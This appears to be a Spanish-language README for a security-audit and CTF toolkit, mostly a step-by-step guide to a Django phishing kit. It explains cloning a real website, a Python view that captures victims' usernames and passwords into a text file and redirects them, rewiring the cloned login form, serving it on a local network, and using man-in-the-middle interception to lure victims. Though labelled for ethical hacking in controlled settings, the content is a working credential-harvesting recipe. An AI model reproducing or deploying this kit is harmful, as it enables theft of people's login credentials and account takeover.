# Herramientas para el uso en auditorías de seguridad o CTF (Capture the Flag)

## Fuzzing
El fuzzer está diseñado para encontrar directorios o archivos ocultos en páginas web.

## Brute-Force
1. Breaking passwords:
    Para realizar ataques de fuerza bruta de manera local después de obtener y identificar un hash de contraseña.

# Social-Engineering

## Proyecto de Phishing en Django

## Descripción
Este proyecto te permite clonar páginas web y capturar credenciales mediante un formulario. Es ideal para realizar demostraciones o pruebas de seguridad (ethical hacking) en entornos controlados.

## Requisitos
- Conocimientos básicos de Django.
- Habilidad para modificar plantillas HTML.

## Dependencias
- Python
- Django
- Node.js y npm (para formateo de HTML con Prettier)

## Guía de Uso

Esta herramienta requiere que sepas cómo manipular plantillas HTML y entender el flujo básico de una aplicación Django.

### 1. Clonar una página web

Utiliza el script `clonar.py`, ubicado en la raíz del proyecto, para clonar la página web deseada. Este script solicitará la URL del sitio web y almacenará su contenido en la carpeta `templates`.

### 2. Organizar el HTML

El código HTML copiado de una página web puede venir desordenado y difícil de leer. Para mejorar su legibilidad, usa `Prettier` como formateador de código.

- **Instalación de Node.js y npm** (si no los tienes instalados):

    ```bash
    sudo apt install nodejs npm
    ```

- **Instalación de Prettier**:

    ```bash
    npm install -g prettier
    ```

- **Formateo del archivo HTML**:

    Dirígete a la carpeta `templates` y ejecuta el siguiente comando para formatear el archivo `index.html`:

    ```bash
    prettier --write index.html
    ```

    Tras esto, el archivo será más legible y estará listo para su modificación.

### 3. Modificación de la vista `capturar`

En la vista `capturar`, ubicada en la carpeta principal `phishing`, debes modificar los parámetros según los nombres de los inputs del formulario HTML que has clonado.

- Código de ejemplo para la vista `capturar`:

    ```python
    def capturar(request):
        if request.method == 'POST':
            username = request.POST['{MODIFICA}']  # Nombre del input para el usuario
            password = request.POST['{MODIFICA}']  # Nombre del input para la contraseña
            with open('credenciales.txt', 'a') as data:  # Abre el archivo para agregar credenciales
                data.write(f"[+]Usuario = {username} : [+]Contraseña = {password}\n")
            return HttpResponseRedirect('{URL DONDE DESEES REDIRIGIR A LA VÍCTIMA}')
    ```

    **Nota**: Asegúrate de modificar `{MODIFICA}` con el nombre exacto del atributo `name` de los inputs en tu HTML.

### 4. Modificar el archivo `index.html`

Dentro de la plantilla HTML clonado, debes hacer los siguientes ajustes:

1. **Cambiar la acción del formulario**:

    Localiza la etiqueta `<form>` y ajusta el atributo `action` para que apunte a la URL de la vista `capturar` en Django.

    - *Ejemplo*:

    ```html
    <form action="{% url 'capturar' %}" method="POST">
    ```

2. **Agregar el CSRF token**:

    Asegúrate de incluir el token CSRF de Django para que el formulario sea válido.

    - *Ejemplo*:

    ```html
    <form action="{% url 'capturar' %}" method="POST">
        {% csrf_token %}
    ```

3. **Actualizar los `name` de los inputs**:

    Cambia el valor del atributo `name` en cada input para que coincida con los nombres que has configurado en la vista `capturar`.

    - *Ejemplo*:

    ```html
    <input type="text" name="username" placeholder="Usuario">
    <input type="password" name="password" placeholder="Contraseña">
    ```

    O ajusta la vista para coincidir con los nombres existentes de los inputs en tu formulario.

### 5. Modificar el archivo `settings.py`

Para poder compartir el proyecto en una red local y ejecutar el servidor, debes agregar la IP de tu red local en la configuración de `ALLOWED_HOSTS` dentro de `settings.py`.

1. Abre `settings.py` y busca la variable `ALLOWED_HOSTS`.
   
2. Agrega la dirección IP de tu red local, por ejemplo:

    ```python
    ALLOWED_HOSTS = ['192.168.1.100']  # Reemplaza con tu IP local
    ```

3. Luego, ejecuta el servidor de Django con:

    ```bash
    python manage.py runserver 0.0.0.0:8000
    ```

    Esto permitirá acceder al proyecto desde otros dispositivos en la misma red local.

### Nota sobre redireccionamientos

Puedes redirigir a la víctima solo si estás ejecutando un ataque de Man-in-the-Middle (MITM), lo cual permite interceptar el tráfico de la víctima y redirigirla a tu página clonada.

